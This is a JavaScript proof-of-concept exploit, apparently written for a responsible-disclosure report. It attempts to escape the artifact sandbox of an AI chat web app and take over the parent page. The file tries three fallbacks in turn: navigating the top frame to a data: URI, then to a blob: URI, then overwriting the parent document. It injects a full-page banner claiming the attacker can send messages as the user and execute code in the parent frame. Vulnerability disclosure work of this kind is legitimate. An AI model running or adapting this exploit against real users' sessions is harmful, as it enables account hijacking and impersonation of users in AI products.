// Sandbox Escape Probe v9 - Self-contained Full Page Takeover
// Researcher: Sagi Layani, Oasis Security
// No external server needed - injects HTML directly via data: URI

const TAKEOVER_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>claude.ai</title>
<style>
@keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
@keyframes scanline{0%{transform:translateY(-100%)}100%{transform:translateY(100vh)}}
*{margin:0;padding:0;box-sizing:border-box}
body{
  background:linear-gradient(135deg,#0a0a0a 0%,#1a0a2e 50%,#0a0a0a 100%);
  min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;
  font-family:system-ui,-apple-system,sans-serif;color:#fff;text-align:center;
  overflow:hidden;position:relative;
}
body::before{
  content:'';position:absolute;top:0;left:0;width:100%;height:100%;
  opacity:0.03;pointer-events:none;
  background:repeating-linear-gradient(0deg,transparent,transparent 2px,#fff 2px,#fff 3px);
}
.scanline{
  position:absolute;top:0;left:0;width:100%;height:4px;
  background:linear-gradient(180deg,transparent,rgba(0,221,255,0.15),transparent);
  animation:scanline 3s linear infinite;pointer-events:none;z-index:10;
}
.logo{animation:fadeIn 0.8s ease-out}
.title{
  font-size:48px;font-weight:700;letter-spacing:-1.5px;
  background:linear-gradient(90deg,#ff4444,#ff6b6b,#ff4444);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
  animation:fadeIn 0.8s ease-out 0.2s both;
}
.subtitle{font-size:18px;color:#888;margin-top:8px;max-width:650px;line-height:1.6;animation:fadeIn 0.8s ease-out 0.4s both}
.card{
  background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);
  border-radius:16px;padding:36px 52px;margin:32px 0;
  backdrop-filter:blur(10px);animation:fadeIn 0.8s ease-out 0.6s both;
}
.card-label{font-size:13px;color:#666;text-transform:uppercase;letter-spacing:2px;margin-bottom:12px}
.card-name{font-size:32px;font-weight:600;color:#fff;margin-bottom:4px}
.card-org{font-size:20px;color:#0df;font-weight:500}
.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;max-width:620px;width:100%;animation:fadeIn 0.8s ease-out 0.8s both}
.stat{border-radius:10px;padding:16px}
.stat-icon{font-size:28px;font-weight:700}
.stat-label{font-size:11px;color:#888;margin-top:6px;line-height:1.4}
.s1{background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.2)}
.s1 .stat-icon{color:#0f8}
.s2{background:rgba(0,221,255,0.1);border:1px solid rgba(0,221,255,0.2)}
.s2 .stat-icon{color:#0df}
.s3{background:rgba(255,68,68,0.1);border:1px solid rgba(255,68,68,0.2)}
.s3 .stat-icon{color:#f44}
.footer{font-size:11px;color:#444;max-width:500px;line-height:1.5;margin-top:28px;animation:fadeIn 0.8s ease-out 1s both}
.url-bar{
  position:fixed;top:12px;left:50%;transform:translateX(-50%);
  background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.1);
  border-radius:8px;padding:8px 20px;font-size:13px;color:#888;
  font-family:monospace;animation:fadeIn 0.8s ease-out;
  backdrop-filter:blur(10px);
}
.url-bar span{color:#0f8}
</style>
</head>
<body>
<div class="scanline"></div>
<div class="url-bar">
  <span>https://claude.ai</span>/chat — page context hijacked by artifact
</div>
<div class="logo">
  <img src="https://cybersecurity-excellence-awards.com/wp-content/uploads/255242.png"
    style="height:90px;object-fit:contain;filter:drop-shadow(0 0 24px rgba(0,221,255,0.3))" alt="Oasis Security">
</div>
<h1 class="title">JavaScript Successfully Injected</h1>
<p class="subtitle">
  Artifact Sandbox Escape — This allows an attacker to get full access
  into a User's Claude instance in just a second
</p>
<div class="card">
  <div class="card-label">Responsible Disclosure By</div>
  <div class="card-name">Sagi Layani</div>
  <div class="card-org">Oasis Security</div>
</div>
<div class="grid">
  <div class="stat s1">
    <div class="stat-icon">&#10003;</div>
    <div class="stat-label">Send Messages<br>as User</div>
  </div>
  <div class="stat s2">
    <div class="stat-icon">&#10003;</div>
    <div class="stat-label">Full Page<br>Navigation Hijack</div>
  </div>
  <div class="stat s3">
    <div class="stat-icon">&#10003;</div>
    <div class="stat-label">Execute Code<br>in Parent Frame</div>
  </div>
</div>
<p class="footer">
  This is a responsible disclosure proof-of-concept. No data was exfiltrated or stored.<br>
  Reported via Anthropic's Vulnerability Disclosure Program on HackerOne.
</p>
</body>
</html>`;

async function poc() {
  console.log("=== SANDBOX ESCAPE PoC v9 - Full Page Takeover ===");
  console.log("Researcher: Sagi Layani, Oasis Security\n");

  // Navigate top frame to our takeover page via data: URI
  console.log("[1] Hijacking top-level page via data: URI...");
  try {
    window.top.location = 'data:text/html;charset=utf-8,' + encodeURIComponent(TAKEOVER_HTML);
    console.log("[1] SUCCESS: top.location set to data: URI");
    return; // Page will navigate away
  } catch(e) {
    console.log("[1] data: URI blocked:", e.message);
  }

  // Fallback: try blob: URI
  console.log("[2] Trying blob: URI...");
  try {
    const blob = new Blob([TAKEOVER_HTML], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    window.top.location = url;
    console.log("[2] SUCCESS: top.location set to blob: URI");
    return;
  } catch(e) {
    console.log("[2] blob: URI blocked:", e.message);
  }

  // Fallback: overwrite parent document entirely (same-origin, always works)
  console.log("[3] Overwriting parent document...");
  try {
    const parentDoc = window.parent.document;
    parentDoc.open();
    parentDoc.write(TAKEOVER_HTML);
    parentDoc.close();
    console.log("[3] SUCCESS: Parent document overwritten");
  } catch(e) {
    console.log("[3] FAILED:", e.message);
  }
}

poc().catch(e => console.error("POC failed:", e));
